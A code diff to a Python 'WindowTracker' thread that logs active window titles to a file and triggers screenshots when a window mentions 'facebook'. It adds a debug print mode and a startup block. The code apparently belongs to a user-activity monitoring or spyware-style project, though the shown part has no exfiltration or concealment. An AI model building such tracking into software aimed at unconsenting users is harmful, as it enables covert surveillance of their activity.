@@ -14,6 +14,7 @@ class WindowTracker(Thread):
         self.__screenshot = screenshot
         self.__screenshotTrigger = ['facebook']
         self.__filehandler = filehandler
+        self.__debug = True
 
 
 
@@ -27,11 +28,14 @@ class WindowTracker(Thread):
 
 
 
-    def checkWindow(self, activeWindowText:str) -> None:
-        if self.__activeWindow != activeWindowText:
-            self.__activeWindow = activeWindowText
-            string = '\n'*2 + f'{self.__activeWindow}'.center(100,'-') + '\n'
-            self.__filehandler.writeToFile(string)
+    def checkWindow(self, activeWindowTitle:str) -> None:
+        if self.__activeWindow != activeWindowTitle:
+            self.__activeWindow = activeWindowTitle
+            windowTitle = '\n'*2 + f'{self.__activeWindow}'.center(100,'-') + '\n'
+            if self.__debug:
+                print(windowTitle)
+            else:
+                self.__filehandler.writeToFile(windowTitle)
 
 
 
@@ -41,3 +45,15 @@ class WindowTracker(Thread):
                 self.__screenshot.isActive = True
             else:
                 self.__screenshot.isActive = False
+
+
+
+
+if __name__ == "__main__":
+    from FileHandler import FileHandler
+    from os import system
+    system('cls')
+    fileHandler = FileHandler()
+    screenshot = Screenshot()
+    windowTracker = WindowTracker(screenshot, fileHandler)
+    windowTracker.start()
